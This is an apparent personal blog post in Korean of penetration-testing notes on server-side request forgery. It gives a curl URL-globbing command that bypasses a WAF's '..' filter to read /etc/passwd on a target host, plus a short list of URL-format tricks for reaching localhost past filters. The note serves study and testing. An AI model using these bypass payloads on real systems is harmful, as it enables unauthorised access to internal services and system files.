---
title: SSRF(Server Side Request Forgery)
author: janger
date: 2023-10-07
category: Web Hacking
layout: post
---

## Curl URL globbing - WAF bypass
dotdot(..)과 %가 필터링 되는 경우 URL globbing을 사용하여 우회가 가능하다. 
~~~ bash
curl http://target.com/{.}{.}/{.}{.}/etc/passwd
~~~


## URL Format Bypass
~~~ 
http:@0/
http@0/
http://①②⑦.⓪.⓪.①/
http://127。0。0。1
~~~

## Reference

[https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

[https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass)

[https://everything.curl.dev/cmdline/globbing](https://everything.curl.dev/cmdline/globbing)
